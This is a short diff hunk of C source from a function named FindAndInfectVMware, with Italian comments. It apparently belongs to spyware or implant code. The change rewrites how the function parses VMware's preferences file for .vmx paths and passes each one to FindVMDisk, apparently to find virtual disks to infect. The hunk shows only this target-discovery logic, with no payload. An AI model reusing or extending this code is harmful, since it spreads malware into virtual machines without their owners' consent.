@@ -1077,45 +1077,19 @@ void FindAndInfectVMware()
 		memcpy(local_config_map, config_map, config_size);
 		FNC(UnmapViewOfFile)(config_map);
 
-		// Parsa per VMWare workstation
-		for (i=0;; i++) {
-			sprintf(obj_string, "pref.ws.openedObj%d.", i);
-			ptr = strstr(local_config_map, obj_string);
-			if (!ptr)
-				break;
-
-			sprintf(obj_string, "pref.ws.openedObj%d.file = \"", i);
-			if (ptr = strstr(ptr, obj_string)) {
-				ptr += strlen(obj_string);
-				ptr_end = strchr(ptr, '"');
-				if (ptr_end) {
-					*ptr_end = 0;
-					// Per ogni macchina trovata, cerca il disco virtuale corrispondente
-					FindVMDisk(ptr);	
-					*ptr_end = '"';
-				}
+		// Parsa per cercare i vmx
+		ptr_end = local_config_map;
+		while (ptr = strstr(ptr_end, ".vmx\"")) {
+			ptr_end = ptr + strlen(".vmx");
+			*ptr_end = NULL;
+			for(;*ptr!='"' && ptr!=local_config_map; ptr--);
+			if (*ptr == '"') {
+				ptr++;
+				// Per ogni macchina trovata, cerca il disco virtuale corrispondente
+				FindVMDisk(ptr);	
 			}
-		}
-
-		// Parsa per VMWare Player
-		for (i=0;; i++) {
-			sprintf(obj_string, "pref.mruVM%d.", i);
-			ptr = strstr(local_config_map, obj_string);
-			if (!ptr)
-				break;
-
-			sprintf(obj_string, "pref.mruVM%d.filename = \"", i);
-			if (ptr = strstr(ptr, obj_string)) {
-				ptr += strlen(obj_string);
-				ptr_end = strchr(ptr, '"');
-				if (ptr_end) {
-					*ptr_end = 0;
-					// Per ogni macchina trovata, cerca il disco virtuale corrispondente
-					FindVMDisk(ptr);	
-					*ptr_end = '"';
-				}
-			}
-		}
+			*ptr_end = '"';
+		}	
 	}
 	SAFE_FREE(local_config_map);
 	CloseHandle(hMap);
